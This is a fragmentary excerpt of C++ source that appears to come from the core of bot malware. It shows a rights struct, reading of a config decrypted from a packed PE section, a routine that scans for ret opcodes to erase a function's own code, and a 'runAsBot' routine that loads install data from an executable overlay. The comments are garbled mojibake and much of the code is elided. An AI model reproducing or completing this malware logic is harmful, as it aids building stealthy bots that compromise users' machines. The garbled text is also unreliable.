...
typedef struct
{
  DWORD nameId;  //��� ��������, ����� ��������� ����� ���� folder == CSIDL_DESKTOP.
  DWORD rights; //����� CDPF_RIGHT_*.
  DWORD folder; //����� �������� CSIDL_. ���� folder == CSIDL_DESKTOP, ����� ����� ���� �����.
}
PROCESSRIGHTS;
...
static bool __inline initObjects(DWORD flags)
{
  ...
  {
    BASECONFIG bs;
    Core::getBaseConfig(&bs); //!!! ��������� ����� PeCrypt::_decryptSection().
...
void Core::_destroyFunction(void *p)
{
  ...
  for(;;)
  {
    ...
    if(size == (DWORD)(-1) || *cur == 0xC3 || *cur == 0xC2 || *cur == 0xCB || *cur == 0xCA)break; //��� ���� ret ��� x32, x64
...
static bool runAsBot(bool forceUpdate, bool removeItself)
{
  ...
  if(overlaySize == sizeof(PESETTINGS))
  {
    ...
    if(CoreInstall::_loadInstalledData(overlay, overlaySize))
    {
      ...
      {
        //FIXME: ��������� LocalSettings::PSF_USER_DISABLED.
        {
          LocalSettings::SETTINGS settings;
